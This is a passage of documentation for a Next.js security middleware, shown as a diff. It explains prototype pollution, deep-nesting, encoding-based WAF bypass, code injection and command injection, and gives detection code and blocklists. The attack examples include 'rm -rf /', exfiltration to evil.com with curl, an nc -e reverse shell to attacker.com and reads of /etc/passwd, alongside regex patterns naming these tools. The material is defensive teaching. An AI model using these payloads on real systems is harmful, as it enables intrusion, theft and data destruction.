+        require('child_process').exec('rm -rf /');
+      }
+    }
+  }
+};
+
+// Without protection:
+Object.constructor.prototype.executeCode = function() { /* evil */ };
+
+// Now every object has malicious methods
+const anyObject = {};
+anyObject.executeCode(); // RCE achieved
+```
+
+**What Happens Without Protection:**
+- Custom methods added to all objects
+- Code execution possible
+- Server compromise achieved
+
+**Impact:**
+- Remote Code Execution (RCE)
+- File system access
+- Steal API keys and secrets
+- Install backdoors
+
+#### 3. **The `prototype` Attack**
+
+```javascript
+// Attacker creates custom class
+class User {
+  constructor(data) {
+    Object.assign(this, data);
+  }
+}
+
+// Attacker sends
+const malicious = {
+  "name": "John",
+  "prototype": {
+    "role": "superadmin"
+  }
+};
+
+const user = new User(malicious);
+
+// Without protection:
+User.prototype.role = "superadmin";
+
+// All User instances are now superadmin
+const attacker = new User({ name: "Attacker" });
+console.log(attacker.role); // "superadmin" 
+```
+
+**What Happens Without Protection:**
+- Class prototypes modified
+- All instances affected
+- Privilege escalation achieved
+
+**Impact:**
+- Privilege escalation (User â†’ SuperAdmin)
+- All future instances compromised
+
+#### 4. **Hidden Properties Attack**
+
+```javascript
+// Sophisticated attacker uses non-enumerable properties
+const malicious = {
+  "username": "user123"
+};
+
+Object.defineProperty(malicious, '__proto__', {
+  value: { isAdmin: true },
+  enumerable: false,  // Hidden from Object.keys()
+});
+
+// Traditional check FAILS
+console.log(Object.keys(malicious)); // ["username"] - looks safe!
+console.log(malicious.__proto__);     // { isAdmin: true } - but isn't!
+```
+
+**What Happens Without Protection:**
+- Hidden properties go undetected
+- Object appears safe
+- Attack succeeds silently
+
+**Impact:**
+- Stealth attacks bypass logging
+- Detection evasion
+- Time bomb - activates later
+
+## How nextjs-fortress Solves This
+
+### The Algorithm
+
+```typescript
+/**
+ * Check for dangerous keys that could lead to prototype pollution
+ */
+private checkDangerousKeys(
+  obj: unknown,
+  path: string = ''
+): ValidationResult {
+  if (obj === null || typeof obj !== 'object') {
+    return { valid: true };
+  }
+
+  const target = obj as Record<string, unknown>;
+
+  // 1. Get ALL keys (including non-enumerable)
+  const keys = Reflect.ownKeys(target);
+
+  for (const key of keys) {
+    if (typeof key !== 'string') continue;
+
+    const lowerKey = key.toLowerCase();
+
+    // 2. Check against blocklist
+    if (this.blockList.has(lowerKey)) {
+      return {
+        valid: false,
+        severity: 'critical',
+        message: `Dangerous key detected: "${key}" at path "${path}"`,
+        rule: 'dangerous_key',
+        pattern: key,
+        confidence: 1.0,
+      };
+    }
+
+    const currentPath = path ? `${path}.${key}` : key;
+
+    // 3. Recursively check nested objects
+    try {
+      const result = this.checkDangerousKeys(target[key], currentPath);
+      if (!result.valid) return result;
+    } catch {
+      continue;
+    }
+  }
+
+  // 4. THE CRITICAL CHECK: Prototype validation
+  const proto = Object.getPrototypeOf(obj);
+  if (proto && proto !== Object.prototype && proto !== Array.prototype) {
+    return {
+      valid: false,
+      severity: 'critical',
+      message: `Custom prototype detected at path "${path}"`,
+      rule: 'custom_prototype_detected',
+      confidence: 1.0,
+    };
+  }
+
+  return { valid: true };
+}
+```
+
+### Why This Works
+
+**1. Comprehensive Detection** - Uses `Reflect.ownKeys()` to catch hidden properties
+**2. Case-Insensitive** - Catches `__proto__`, `__Proto__`, `__PROTO__`
+**3. Prototype Validation** - Detects swapped prototype chains
+**4. Deep Scanning** - Recursively checks all nested levels
+
+## The Blocklist Explained
+
+| Key | Why Dangerous | Attack Vector |
+|-----|---------------|---------------|
+| `__proto__` | Direct prototype access | Pollutes Object.prototype |
+| `constructor` | Access to constructor function | Modifies constructor.prototype |
+| `prototype` | Class prototype | Affects all class instances |
+| `__defineGetter__` | Define property getters | Custom property behavior |
+| `__defineSetter__` | Define property setters | Custom property behavior |
+| `toString` | Object string conversion | Override default behavior |
+| `valueOf` | Object primitive conversion | Type coercion attacks |
+| `hasOwnProperty` | Property existence check | Logic bypass |
+
+## How to Initialize
+
+```typescript
+import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    deserialization: {
+      enabled: true,              // Always enabled
+      maxDepth: 10,
+      detectCircular: true,
+      
+      blockList: [                // Dangerous keys to block
+        '__proto__',
+        'constructor',
+        'prototype',
+        '__defineGetter__',
+        '__defineSetter__',
+        '__lookupGetter__',
+        '__lookupSetter__',
+        'toString',
+        'valueOf',
+        'hasOwnProperty',
+      ],
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    const logger = new FortressLogger({
+      enabled: true,
+      level: 'warn',
+      destination: 'console',
+    });
+
+    if (event.detection.rule === 'dangerous_key') {
+      logger.warn('ðŸš¨ Prototype Pollution Attempt Blocked', {
+        key: event.detection.pattern,
+        ip: event.request.ip,
+        path: event.request.path,
+      });
+    }
+  },
+};
+```
+
+## Summary
+
+**What happens without dangerous keys detection:**
+- Prototype pollution succeeds
+- Authentication bypass
+- Privilege escalation
+- Remote code execution
+- Complete security collapse
+
+**What nextjs-fortress provides:**
+- Comprehensive key scanning
+- Non-enumerable property detection
+- Prototype chain validation
+- Recursive inspection
+- Custom blocklist support
+
+**How to initialize:**
+```typescript
+deserialization: {
+  enabled: true,              // Always enabled
+  blockList: [                // Dangerous keys
+    '__proto__',
+    'constructor',
+    'prototype',
+    // Add custom keys here
+  ],
+}
+```
+
+---
+
+**Related Documentation:**
+- [Depth Limiting](./depth-limiting.md)
+- [Circular References](./circular-references.md)
+- [Dangerous Patterns](./dangerous-patterns.md)
+- [CVE-2025-55182 Details](../../cve/cve-2025-55182.md)
+
+
+================================================
+FILE: docs/modules/deserialization/dangerous-patterns.md
+================================================
+Error reading file with 'cp1252': 'charmap' codec can't decode byte 0x8d in position 6701: character maps to <undefined>
+
+
+================================================
+FILE: docs/modules/deserialization/depth-limiting.md
+================================================
+# Depth Limiting Protection
+
+## Overview
+
+Depth limiting prevents attackers from sending deeply nested objects to overwhelm your server, bypass validation, or exploit parsing vulnerabilities.
+
+## Why This Is Important
+
+### The Problem: Deeply Nested Attack Payloads
+
+Attackers can craft malicious payloads with excessive nesting to:
+
+#### 1. **Stack Overflow Attacks**
+
+```json
+{
+  "level1": {
+    "level2": {
+      "level3": {
+        // ... 1000+ levels deep
+        "level1000": {
+          "__proto__": {
+            "isAdmin": true
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+**What Happens Without Protection:**
+- JavaScript call stack overflows
+- Server crashes with `RangeError: Maximum call stack size exceeded`
+- Application becomes unavailable
+- Denial of Service (DoS) achieved
+
+**Impact:**
+- Application crashes and downtime
+- Continuous crash loops
+- CPU spikes and memory leaks
+- All users affected
+
+#### 2. **Validation Bypass**
+
+```json
+{
+  "user": {
+    "profile": {
+      "settings": {
+        "preferences": {
+          "security": {
+            "advanced": {
+              "deep": {
+                "hidden": {
+                  "backdoor": {
+                    "__proto__": {
+                      "isAdmin": true
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+**What Happens Without Protection:**
+- Shallow validators only check top 2-3 levels
+- Deep malicious payloads go undetected
+- Prototype pollution succeeds
+- Security breach achieved
+
+**Impact:**
+- Authentication bypass
+- Privilege escalation
+- Unauthorized data access
+
+#### 3. **Parser Exploitation**
+
+```javascript
+// Deeply nested arrays
+[[[[[[[[[[[[[[[["malicious"]]]]]]]]]]]]]]]
+```
+
+**What Happens Without Protection:**
+- JSON parser works harder for each level
+- Exponential time complexity: O(nÂ²) or O(nÂ³)
+- Server becomes unresponsive
+- CPU usage spikes to 100%
+
+**Impact:**
+- Response time degradation 
+- CPU exhaustion
+- Service degradation for all users
+
+#### 4. **Memory Exhaustion**
+
+```typescript
+// Each level allocates memory
+// 1000 levels Ã— 100 bytes = 100KB per request
+// 1000 concurrent requests = 100MB
+```
+
+**What Happens Without Protection:**
+- Each nested level allocates memory
+- Memory not released until request completes
+- Multiple concurrent requests multiply impact
+- Server runs out of memory
+
+**Impact:**
+- Out of Memory errors and crashes
+- Garbage collection storms
+- Performance degradation
+
+## How nextjs-fortress Solves This
+
+### The Algorithm
+
+```typescript
+/**
+ * Check nesting depth to prevent deeply nested attacks
+ */
+private checkDepth(obj: unknown, currentDepth: number): ValidationResult {
+  // Base case: exceeded max depth
+  if (currentDepth > this.config.maxDepth) {
+    return {
+      valid: false,
+      severity: 'medium',
+      message: `Nesting depth exceeds maximum (${this.config.maxDepth})`,
+      rule: 'max_depth_exceeded',
+      confidence: 0.85,
+    }
+  }
+
+  // Not an object - no need to go deeper
+  if (obj === null || typeof obj !== 'object') {
+    return { valid: true }
+  }
+
+  // Recursively check all nested values
+  for (const value of Object.values(obj)) {
+    if (value !== null && typeof value === 'object') {
+      const result = this.checkDepth(value, currentDepth + 1)
+      if (!result.valid) {
+        return result // Stop immediately on failure
+      }
+    }
+  }
+
+  return { valid: true }
+}
+```
+
+### Why This Works
+
+**1. Early Detection** - Stops immediately when limit exceeded
+**2. Efficient Checking** - O(n) time, O(d) space
+**3. Configurable Limits** - Adjust based on your needs
+
+## How to Initialize
+
+```typescript
+import { FortressConfig } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    deserialization: {
+      enabled: true,
+      maxDepth: 10,              // Set depth limit
+      detectCircular: true,      // Enable circular detection
+      blockList: [               // Dangerous keys
+        '__proto__',
+        'constructor',
+        'prototype'
+      ],
+    },
+  },
+};
+```
+
+## Summary
+
+**What happens without depth limiting:**
+- Stack overflow crashes
+- DoS attacks succeed
+- Validation bypasses
+- Memory exhaustion
+
+**What nextjs-fortress provides:**
+- Configurable depth limits
+- Early attack detection
+- Efficient validation
+- Zero performance impact
+
+**How to initialize:**
+```typescript
+deserialization: {
+  enabled: true,
+  maxDepth: 10,  // Blocks after 10 levels
+  detectCircular: true,
+}
+```
+
+---
+
+**Related Documentation:**
+- [Dangerous Keys Detection](./dangerous-keys.md)
+- [Circular Reference Detection](./circular-references.md)
+- [Dangerous Patterns Detection](./dangerous-patterns.md)
+
+
+================================================
+FILE: docs/modules/encoding/ghost-mode.md
+================================================
+# Ghost Mode Protection (Encoding Bypass)
+
+## Overview
+
+Ghost Mode protection detects and blocks encoding-based attacks where attackers use non-standard character encodings (like UTF-16LE) to bypass Web Application Firewalls while delivering malicious payloads to the application.
+
+## Why This Is Important
+
+### The Problem: WAF Bypass via Encoding
+
+Traditional WAFs inspect payloads in UTF-8, but applications may decode other encodings:
+
+#### 1. **The UTF-16LE Bypass**
+
+```javascript
+// What WAF sees (UTF-16LE encoded):
+Ã¿Ã¾_ï¿½ï¿½_pï¿½ï¿½rï¿½ï¿½oï¿½ï¿½tï¿½ï¿½oï¿½ï¿½_ï¿½ï¿½_
+
+// What application decodes:
+__proto__
+
+// Result: WAF sees gibberish, app sees attack
+```
+
+**What Happens Without Protection:**
+- WAF doesn't recognize malicious pattern
+- Application decodes to dangerous payload
+- Prototype pollution succeeds
+- Attack goes undetected
+
+**Impact:**
+- Complete WAF bypass
+- Prototype pollution
+- CVE-2025-55182 exploitation
+- Zero detection
+
+#### 2. **BOM (Byte Order Mark) Manipulation**
+
+```javascript
+// UTF-16LE BOM: FF FE
+// UTF-16BE BOM: FE FF
+// UTF-32LE BOM: FF FE 00 00
+
+// Attacker sends:
+[0xFF, 0xFE, 0x5F, 0x00, 0x5F, 0x00, ...] // UTF-16LE __proto__
+
+// WAF inspection:
+"Ã¿Ã¾_\u0000_\u0000p\u0000r\u0000..." // Unreadable
+
+// Application decodes:
+"__proto__" // Dangerous!
+```
+
+**What Happens Without Protection:**
+- BOM indicates non-UTF-8 encoding
+- WAF can't parse correctly
+- Application processes malicious content
+- Security bypassed completely
+
+**Impact:**
+- WAF rendered useless Stealth attacks No security logs Undetected exploitation
+
+#### 3. **GB18030 Encoding Attack**
+
+```javascript
+// GB18030 is a Chinese character encoding
+// Can represent ASCII differently
+// Used to bypass pattern matching
+
+// Attacker payload in GB18030:
+[0x84, 0x31, 0x95, 0x33] // BOM
+// + encoded malicious payload
+
+// WAF: Can't read GB18030
+// App: Decodes to attack payload
+```
+
+**What Happens Without Protection:**
+- Exotic encodings bypass WAF
+- Pattern matching fails
+- Injection succeeds
+
+**Impact:**
+- International encoding abuse
+- Security bypass
+- Targeted attacks
+- Silent exploitation
+
+#### 4. **Mixed Encoding Attack**
+
+```javascript
+// Combine multiple encodings
+// UTF-8 for safe parts
+// UTF-16LE for malicious parts
+
+POST /api/user
+Content-Type: application/json; charset=utf-8
+
+{
+  "username": "normal",
+  "data": "\uFFFE__proto__" // UTF-16LE BOM + attack
+}
+```
+
+**What Happens Without Protection:**
+- Mixed encoding confuses parsers
+- Some parts validated, others not
+- Partial bypass achieved
+
+**Impact:**
+- Complex bypass techniques
+- Hard to detect
+- Sophisticated attacks
+
+## How nextjs-fortress Solves This
+
+### Detection Strategy
+
+#### 1. **Content-Type Header Validation**
+
+```typescript
+/**
+ * Validate Content-Type header for dangerous encodings
+ */
+private validateContentTypeHeader(contentType: string): ValidationResult {
+  const lowerContentType = contentType.toLowerCase();
+
+  // Extract charset if present
+  const charsetMatch = lowerContentType.match(/charset=([^;,\s]+)/);
+  if (charsetMatch) {
+    const charset = charsetMatch[1].toLowerCase();
+
+    // Check against dangerous encodings
+    for (const dangerous of DANGEROUS_ENCODINGS) {
+      if (charset.includes(dangerous)) {
+        return {
+          valid: false,
+          severity: 'critical',
+          message: `Dangerous encoding detected: ${charset}`,
+          rule: 'dangerous_encoding',
+          pattern: charset,
+          confidence: 1.0,
+        };
+      }
+    }
+  }
+
+  return { valid: true };
+}
+```
+
+#### 2. **BOM Detection**
+
+```typescript
+/**
+ * Detect BOM (Byte Order Mark) in request body
+ */
+private detectBOM(body: ArrayBuffer): ValidationResult {
+  const bytes = new Uint8Array(body);
+
+  if (bytes.length < 2) return { valid: true };
+
+  // UTF-16LE BOM: FF FE
+  if (bytes[0] === 0xFF && bytes[1] === 0xFE) {
+    if (bytes.length >= 4 && bytes[2] === 0x00 && bytes[3] === 0x00) {
+      return {
+        valid: false,
+        severity: 'critical',
+        message: 'UTF-32LE BOM detected (WAF bypass attempt)',
+        rule: 'bom_utf32le',
+        pattern: 'FF FE 00 00',
+        confidence: 1.0,
+      };
+    }
+
+    return {
+      valid: false,
+      severity: 'critical',
+      message: 'UTF-16LE BOM detected (Ghost Mode WAF bypass)',
+      rule: 'bom_utf16le',
+      pattern: 'FF FE',
+      confidence: 1.0,
+    };
+  }
+
+  // UTF-16BE BOM: FE FF
+  if (bytes[0] === 0xFE && bytes[1] === 0xFF) {
+    return {
+      valid: false,
+      severity: 'critical',
+      message: 'UTF-16BE BOM detected (WAF bypass attempt)',
+      rule: 'bom_utf16be',
+      pattern: 'FE FF',
+      confidence: 1.0,
+    };
+  }
+
+  // GB18030 BOM: 84 31 95 33
+  if (bytes.length >= 4 &&
+      bytes[0] === 0x84 && bytes[1] === 0x31 &&
+      bytes[2] === 0x95 && bytes[3] === 0x33) {
+    return {
+      valid: false,
+      severity: 'high',
+      message: 'GB18030 BOM detected (potential WAF bypass)',
+      rule: 'bom_gb18030',
+      pattern: '84 31 95 33',
+      confidence: 0.95,
+    };
+  }
+
+  return { valid: true };
+}
+```
+
+### Dangerous Encodings List
+
+```typescript
+export const DANGEROUS_ENCODINGS = [
+  'utf-16',
+  'utf-16le',
+  'utf-16be',
+  'utf-32',
+  'utf-32le',
+  'utf-32be',
+  'ucs-2',
+  'iso-2022-jp',
+  'gb18030',
+] as const;
+```
+
+## Attack Examples
+
+### Example 1: UTF-16LE Ghost Mode
+
+```javascript
+// Attacker sends UTF-16LE encoded payload
+POST /api/user
+Content-Type: application/json; charset=utf-16le
+Body: [0xFF, 0xFE, ...]  // UTF-16LE BOM + __proto__
+
+// Fortress detects:
+// 1. Content-Type: charset=utf-16le (DANGEROUS)
+// 2. BOM: FF FE (UTF-16LE)
+// Result: BLOCKED âœ…
+// Message: "UTF-16LE BOM detected (Ghost Mode WAF bypass)"
+```
+
+### Example 2: UTF-32 Encoding
+
+```javascript
+// Attacker uses UTF-32LE
+POST /api/data
+Content-Type: text/plain; charset=utf-32le
+Body: [0xFF, 0xFE, 0x00, 0x00, ...]
+
+// Fortress detects:
+// BOM: FF FE 00 00 (UTF-32LE)
+// Result: BLOCKED âœ…
+// Message: "UTF-32LE BOM detected (WAF bypass attempt)"
+```
+
+### Example 3: Header-Only Attack
+
+```javascript
+// No BOM, but dangerous charset in header
+POST /api/execute
+Content-Type: application/json; charset=utf-16be
+
+// Fortress detects:
+// Content-Type header: charset=utf-16be
+// Result: BLOCKED âœ…
+// Message: "Dangerous encoding detected: utf-16be"
+```
+
+## How to Initialize
+
+```typescript
+import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    encoding: {
+      enabled: true,
+      blockNonUTF8: true,        // Block non-UTF-8
+      detectBOM: true,           // Detect BOMs
+      allowedEncodings: ['utf-8'], // UTF-8 only
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    if (event.type === 'encoding') {
+      const logger = new FortressLogger({
+        enabled: true,
+        level: 'warn',
+        destination: 'console',
+      });
+
+      logger.warn('ðŸ‘» Ghost Mode Attack Blocked', {
+        rule: event.detection.rule,
+        pattern: event.detection.pattern,
+        ip: event.request.ip,
+      });
+    }
+  },
+};
+```
+
+## BOM Detection Reference
+
+| Encoding | BOM Bytes | Pattern | Risk |
+|----------|-----------|---------|------|
+| UTF-16LE | FF FE | Ghost Mode | Critical |
+| UTF-16BE | FE FF | WAF Bypass | Critical |
+| UTF-32LE | FF FE 00 00 | Complex Bypass | Critical |
+| UTF-32BE | 00 00 FE FF | Complex Bypass | Critical |
+| UTF-8 | EF BB BF | Allowed | Low |
+| GB18030 | 84 31 95 33 | Exotic Bypass | High |
+
+## Summary
+
+**What happens without Ghost Mode protection:**
+- WAF completely bypassed
+- Prototype pollution succeeds
+- Zero detection
+- Silent exploitation
+
+**What nextjs-fortress provides:**
+- Content-Type validation
+- BOM detection
+- Non-UTF-8 blocking
+- WAF bypass prevention
+
+**How to initialize:**
+```typescript
+encoding: {
+  enabled: true,
+  blockNonUTF8: true,    // Block dangerous encodings
+  detectBOM: true,       // Detect byte order marks
+}
+```
+
+---
+
+**Related Documentation:**
+- [Dangerous Keys Detection](../deserialization/dangerous-keys.md)
+
+
+================================================
+FILE: docs/modules/injection/code-injection.md
+================================================
+ Code Injection Protection
+
+## Overview
+
+Code injection protection detects and blocks malicious JavaScript code patterns that could be executed via `eval()`, `Function()`, or other dynamic code execution methods.
+
+## Why This Is Important
+
+### The Problem: Code Injection Attacks
+
+Attackers inject executable code that runs in the application context:
+
+#### 1. **eval() Exploitation**
+
+```javascript
+// Calculator app that evaluates expressions
+{
+  "expression": "eval('require(\"child_process\").exec(\"whoami\")')"
+}
+
+// Without protection, if app uses:
+const result = eval(userInput);
+// Executes: eval(eval('require("child_process").exec("whoami")'))
+// Result: Command execution, server compromise
+```
+
+**What Happens Without Protection:**
+- Code executed in application context
+- Full Node.js API access
+- Server compromise
+
+**Impact**: Remote code executi Full API acce File system contr Network access
+
+#### 2. **Function Constructor Attack**
+
+```javascript
+// Dynamic function creation
+{
+  "code": "Function('return process.env')().DATABASE_PASSWORD"
+}
+
+// Without protection:
+const fn = new Function(userCode);
+// Executes: Function that accesses process.env
+// Result: Environment variables stolen
+```
+
+**What Happens Without Protection:**
+- Function constructor bypasses restrictions
+- Environment variables accessed
+- Secrets exposed
+
+**Impact:** Credential theft API key exposure Database passwords stolen Targeted data theft
+
+#### 3. **setTimeout/setInterval String Injection**
+
+```javascript
+// Delayed execution
+{
+  "delay": "1000",
+  "action": "require('fs').readFileSync('/etc/passwd')"
+}
+
+// Without protection:
+setTimeout(userAction, delay);
+// Executes: setTimeout("require('fs').readFileSync('/etc/passwd')", 1000)
+// Result: File system access after delay
+```
+
+**What Happens Without Protection:**
+- String-based setTimeout executes code
+- File system accessed
+- Data stolen
+
+**Impact:**
+- Delayed attacks
+- File access
+- Stealth exploitation
+- Security bypass
+
+#### 4. **Constructor Prototype Injection**
+
+```javascript
+// Access constructor to create functions
+{
+  "data": "constructor.constructor('return process')()"
+}
+
+// Without protection:
+const obj = {};
+obj.constructor.constructor === Function; // true
+// Can execute arbitrary code
+```
+
+**What Happens Without Protection:**
+- Constructor chain access
+- Function creation
+- Code execution
+
+**Impact:**
+- Bypass restrictions
+- Arbitrary execution
+- Security escape
+- Full control
+
+## How nextjs-fortress Solves This
+
+### Detection Patterns
+
+```typescript
+export const CODE_INJECTION_PATTERNS = [
+  /eval\s*\(/gi,                          // eval() calls
+  /Function\s*\(/gi,                      // Function constructor
+  /setTimeout\s*\(\s*["']/gi,             // String-based setTimeout
+  /setInterval\s*\(\s*["']/gi,            // String-based setInterval
+  /\.constructor\s*\(/gi,                 // Constructor access
+  /import\s*\(/gi,                        // Dynamic imports
+  /require\s*\(/gi,                       // CommonJS require
+];
+```
+
+### The Algorithm
+
+```typescript
+/**
+ * Check for code injection patterns
+ */
+private checkPatterns(
+  str: string,
+  patterns: RegExp[],
+  type: string
+): ValidationResult {
+  for (const pattern of patterns) {
+    pattern.lastIndex = 0;
+    const match = pattern.exec(str);
+
+    if (match) {
+      return {
+        valid: false,
+        severity: 'critical',
+        message: `Code injection detected: "${match[0]}"`,
+        rule: 'code_injection',
+        pattern: match[0],
+        confidence: 0.9,
+      };
+    }
+  }
+
+  return { valid: true };
+}
+```
+
+## Attack Examples
+
+### Example 1: eval() Injection
+
+```javascript
+// Calculator request
+POST /api/calculate
+{
+  "formula": "eval('process.exit(1)')"
+}
+
+// Fortress detects:
+// Pattern match: "eval(" found
+// Severity: critical
+// Result: BLOCKED âœ…
+```
+
+### Example 2: Function Constructor
+
+```javascript
+// Dynamic code execution
+POST /api/execute
+{
+  "code": "Function('return process.env')()"
+}
+
+// Fortress detects:
+// Pattern match: "Function(" found
+// Result: BLOCKED âœ…
+```
+
+### Example 3: setTimeout String
+
+```javascript
+// Delayed action
+POST /api/schedule
+{
+  "action": "require('fs').writeFileSync('/tmp/backdoor', 'evil')",
+  "delay": 5000
+}
+
+// Fortress detects:
+// Pattern match: "require(" found
+// Result: BLOCKED âœ…
+```
+
+### Example 4: Constructor Chain
+
+```javascript
+// Prototype chain exploitation
+POST /api/process
+{
+  "data": "{}.constructor.constructor('return this')()"
+}
+
+// Fortress detects:
+// Pattern match: ".constructor(" found
+// Result: BLOCKED âœ…
+```
+
+## Dangerous Patterns Explained
+
+| Pattern | Risk | Why Blocked |
+|---------|------|-------------|
+| `eval()` | Critical | Direct code execution |
+| `Function()` | Critical | Creates executable functions |
+| `setTimeout("code")` | High | String-based execution |
+| `setInterval("code")` | High | Repeated execution |
+| `.constructor()` | Critical | Bypass restrictions |
+| `import()` | High | Dynamic module loading |
+| `require()` | Critical | Node.js module access |
+
+## How to Initialize
+
+```typescript
+import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    injection: {
+      enabled: true,
+      checks: ['codeInjection'],
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    if (event.detection.rule === 'code_injection') {
+      const logger = new FortressLogger({
+        enabled: true,
+        level: 'warn',
+        destination: 'console',
+      });
+
+      logger.warn('ðŸ’» Code Injection Blocked', {
+        pattern: event.detection.pattern,
+        ip: event.request.ip,
+        path: event.request.path,
+      });
+    }
+  },
+};
+```
+
+## Summary
+
+**What happens without code injection protection:**
+- Arbitrary code execution
+- Process manipulation
+- Environment access
+- Complete compromise
+
+**What nextjs-fortress provides:**
+- eval() detection
+- Function constructor blocking
+- setTimeout/setInterval protection
+- Constructor chain prevention
+
+**How to initialize:**
+```typescript
+injection: {
+  enabled: true,
+  checks: ['codeInjection'],
+}
+```
+
+---
+
+**Related Documentation:**
+- [SQL Injection Protection](./sql-injection.md)
+- [Command Injection Protection](./command-injection.md)
+- [XSS Protection](./xss-protection.md)
+
+
+================================================
+FILE: docs/modules/injection/command-injection.md
+================================================
+# Command Injection Protection
+
+## Overview
+
+Command injection protection detects and blocks malicious shell commands in payloads that could execute arbitrary commands on the server operating system.
+
+## Why This Is Important
+
+### The Problem: Command Injection Attacks
+
+Attackers inject shell commands to execute arbitrary code on the server:
+
+#### 1. **Shell Metacharacter Injection**
+
+```javascript
+// File upload with malicious filename
+{
+  "filename": "document.pdf; cat /etc/passwd"
+}
+
+// Without protection, if app uses:
+exec(`convert ${filename} output.jpg`);
+// Executes: convert document.pdf; cat /etc/passwd output.jpg
+// Result: Password file exposed
+```
+
+**What Happens Without Protection:**
+- Shell commands executed
+- System files accessed
+- Credentials exposed
+
+**Impact:**
+- File system access
+- Credential theft
+- System compromise
+- Privilege escalation
+
+#### 2. **Pipe Command Injection**
+
+```javascript
+// Search query with pipe
+{
+  "query": "logs | grep password | curl evil.com -d @-"
+}
+
+// Without protection:
+exec(`cat logs.txt | grep "${query}"`);
+// Executes: cat logs.txt | grep "logs | grep password | curl evil.com -d @-"
+// Result: Passwords sent to attacker
+```
+
+**What Happens Without Protection:**
+- Pipe commands chain operations
+- Data exfiltrated
+- Remote server receives d
+**Impact:** Data exfiltration Silent attacks Credential leakage Database dumps
+
+#### 3. **Command Substitution**
+
+```javascript
+// Backup path with substitution
+{
+  "path": "$(rm -rf /)"
+}
+
+// Without protection:
+exec(`backup ${path}`);
+// Executes: backup $(rm -rf /)
+// Result: Entire filesystem deleted
+```
+
+**What Happens Without Protection:**
+- Command substitution executes first
+- Destructive commands run
+- System destroyed
+
+**Impact:**
+- File system destruction
+- Data deletion
+- Service outage
+- Business loss
+
+#### 4. **Reverse Shell**
+
+```javascript
+// Malicious webhook URL
+{
+  "webhook": "http://example.com; nc -e /bin/bash attacker.com 4444"
+}
+
+// Without protection:
+exec(`curl ${webhook}`);
+// Executes: curl http://example.com; nc -e /bin/bash attacker.com 4444
+// Result: Shell access to attacker
+```
+
+**What Happens Without Protection:**
+- Reverse shell established
+- Attacker gains shell access
+- Full server control
+
+**Impact:**
+- Complete server compromise
+- Root access possible
+- Persistent backdoor
+- Network pivot point
+
+## How nextjs-fortress Solves This
+
+### Detection Patterns
+
+```typescript
+export const COMMAND_PATTERNS = [
+  /[;&|`$(){}[\]<>]/,                    // Shell metacharacters
+  /(bash|sh|cmd|powershell|exec|spawn)/gi, // Shell executables
+  /(\|\s*cat\s+)/gi,                     // Pipe to cat
+  /(>\s*\/dev\/null)/gi,                 // Output redirection
+  /(\$\(.*\))/g,                          // Command substitution
+  /(wget|curl).*http/gi,                  // Remote code fetching
+  /(nc|netcat).*-e/gi,                    // Reverse shells
+];
+```
+
+### The Algorithm
+
+```typescript
+/**
+ * Check a string against command injection patterns
+ */
+private checkPatterns(
+  str: string,
+  patterns: RegExp[],
+  type: string
+): ValidationResult {
+  for (const pattern of patterns) {
+    pattern.lastIndex = 0;
+    const match = pattern.exec(str);
+
+    if (match) {
+      return {
+        valid: false,
+        severity: 'critical',
+        message: `Command injection detected: "${match[0]}"`,
+        rule: 'command_injection',
+        pattern: match[0],
+        confidence: 0.9,
+      };
+    }
+  }
+
+  return { valid: true };
+}
+```
+
+## Attack Examples
+
+### Example 1: Semicolon Command Chaining
+
+```javascript
+// File processing request
+POST /api/process
+{
+  "file": "report.pdf; cat /etc/passwd"
+}
+
+// Fortress detects:
+// Pattern match: ";" found
+// Severity: critical
+// Result: BLOCKED âœ…
+```
+
+### Example 2: Pipe Data Exfiltration
+
+```javascript
+// Log search request
+POST /api/logs/search
+{
+  "term": "error | curl https://evil.com -d @-"
+}
+
+// Fortress detects:
+// Pattern match: "|" and "curl" found
+// Result: BLOCKED âœ…
+```
+
+### Example 3: Command Substitution
+
+```javascript
+// Backup path
+POST /api/backup
+{
+  "destination": "$(whoami)"
+}
+
+// Fortress detects:
+// Pattern match: "$(...)" found
+// Result: BLOCKED âœ…
+```
+
+### Example 4: Reverse Shell
+
+```javascript
+// Webhook callback
+POST /api/webhook
+{
+  "url": "http://site.com; nc -e /bin/bash attacker.com 4444"
+}
+
+// Fortress detects:
+// Pattern match: ";" and "nc -e" found
+// Result: BLOCKED âœ…
+```
+
+## Shell Metacharacters Blocked
+
+```typescript
+// These characters enable command chaining and injection
+;   // Command separator
+&   // Background execution
+|   // Pipe to another command
+`   // Command substitution (backticks)
+$   // Variable/command substitution
+()  // Subshell execution
+{}  // Brace expansion
+[]  // Character class
+<>  // Input/output redirection
+```
+
+## How to Initialize
+
+```typescript
+import { FortressConfig, FortressLogger } from '@mindfiredigital/nextjs-fortress';
+
+export const fortressConfig: FortressConfig = {
+  enabled: true,
+  mode: 'development',
+
+  modules: {
+    injection: {
+      enabled: true,
+      checks: ['command'],
+    },
+  },
+
+  onSecurityEvent: async (event) => {
+    if (event.detection.rule === 'command_injection') {
+      const logger = new FortressLogger({
+        enabled: true,
+        level: 'warn',
+        destination: 'console',
+      });
+
+      logger.warn('âš¡ Command Injection Blocked', {
+        pattern: event.detection.pattern,
+        ip: event.request.ip,
+        path: event.request.path,
+      });
+    }
+  },
+};
+```
+
+## Summary
+
+**What happens without command injection protection:**
+- Arbitrary command execution
+- File system access
+- Data exfiltration
+- Complete server compromise
+
+**What nextjs-fortress provides:**
+- Metacharacter detection
+- Shell command blocking
+- Substitution prevention
+- Reverse shell protection
+
+**How to initialize:**
+```typescript
+injection: {
+  enabled: true,
+  checks: ['command'],
+}
+```
+
+---
+
+**Related Documentation:**
+- [SQL Injection Protection](./sql-injection.md)
+- [XSS Protection](./xss-protection.md)
+- [Code Injection Protection](./code-injection.md)
+
+
+================================================
